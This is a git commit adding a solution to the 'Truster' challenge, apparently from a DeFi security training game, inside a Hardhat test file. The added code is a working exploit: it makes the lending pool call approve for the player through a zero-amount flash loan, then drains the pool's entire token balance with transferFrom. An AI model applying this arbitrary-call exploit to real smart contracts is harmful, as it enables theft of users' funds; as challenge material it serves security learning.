00d392e122c3904d6780caa58ba4f8c6aeade92d
Amin Bashiri <amin.bashiri28@gmail.com>
2023-02-19 09:56:17 -0700

    Add Truster solution

--- test/truster/truster.challenge.js
+++ test/truster/truster.challenge.js
@@ -1,40 +1,61 @@
-const { ethers } = require('hardhat');
-const { expect } = require('chai');
+const { ethers } = require("hardhat");
+const { expect } = require("chai");
 
-describe('[Challenge] Truster', function () {
-    let deployer, player;
-    let token, pool;
+describe("[Challenge] Truster", function () {
+  let deployer, player;
+  let token, pool;
 
-    const TOKENS_IN_POOL = 1000000n * 10n ** 18n;
+  const TOKENS_IN_POOL = 1000000n * 10n ** 18n;
 
-    before(async function () {
-        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
-        [deployer, player] = await ethers.getSigners();
+  before(async function () {
+    /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
+    [deployer, player] = await ethers.getSigners();
 
-        token = await (await ethers.getContractFactory('DamnValuableToken', deployer)).deploy();
-        pool = await (await ethers.getContractFactory('TrusterLenderPool', deployer)).deploy(token.address);
-        expect(await pool.token()).to.eq(token.address);
+    token = await (
+      await ethers.getContractFactory("DamnValuableToken", deployer)
+    ).deploy();
+    pool = await (
+      await ethers.getContractFactory("TrusterLenderPool", deployer)
+    ).deploy(token.address);
+    expect(await pool.token()).to.eq(token.address);
 
-        await token.transfer(pool.address, TOKENS_IN_POOL);
-        expect(await token.balanceOf(pool.address)).to.equal(TOKENS_IN_POOL);
+    await token.transfer(pool.address, TOKENS_IN_POOL);
+    expect(await token.balanceOf(pool.address)).to.equal(TOKENS_IN_POOL);
 
-        expect(await token.balanceOf(player.address)).to.equal(0);
-    });
+    expect(await token.balanceOf(player.address)).to.equal(0);
+  });
 
-    it('Execution', async function () {
-        /** CODE YOUR SOLUTION HERE */
-    });
+  it("Execution", async function () {
+    /** CODE YOUR SOLUTION HERE */
+    const approveCall = token.interface.encodeFunctionData("approve", [
+      player.address,
+      TOKENS_IN_POOL,
+    ]);
 
-    after(async function () {
-        /** SUCCESS CONDITIONS - NO NEED TO CHANGE ANYTHING HERE */
+    console.log("Created the approveCall data: ", approveCall);
 
-        // Player has taken all tokens from the pool
-        expect(
-            await token.balanceOf(player.address)
-        ).to.equal(TOKENS_IN_POOL);
-        expect(
-            await token.balanceOf(pool.address)
-        ).to.equal(0);
-    });
+    await pool
+      .connect(player)
+      .flashLoan(0, player.address, token.address, approveCall);
+
+    console.log(
+      "Called the flashLoan function with zero, just to get approved"
+    );
+
+    await token
+      .connect(player)
+      .transferFrom(pool.address, player.address, TOKENS_IN_POOL);
+
+    console.log("Transferred all tokens from the pool to the player");
+    console.log("Player balance: ", await token.balanceOf(player.address));
+    console.log("Pool balance: ", await token.balanceOf(pool.address));
+  });
+
+  after(async function () {
+    /** SUCCESS CONDITIONS - NO NEED TO CHANGE ANYTHING HERE */
+
+    // Player has taken all tokens from the pool
+    expect(await token.balanceOf(player.address)).to.equal(TOKENS_IN_POOL);
+    expect(await token.balanceOf(pool.address)).to.equal(0);
+  });
 });
-
